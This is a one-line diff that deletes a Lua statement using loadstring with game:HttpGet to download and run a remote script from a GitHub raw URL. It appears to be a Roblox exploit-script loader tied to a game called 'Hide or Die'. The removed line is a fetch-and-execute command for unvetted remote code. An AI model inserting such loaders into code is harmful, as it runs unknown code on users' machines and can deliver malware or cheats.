@@ -1,2 +1,0 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/0xWhoami35/hide-or-die/refs/heads/main/sc.lua", false))()
-
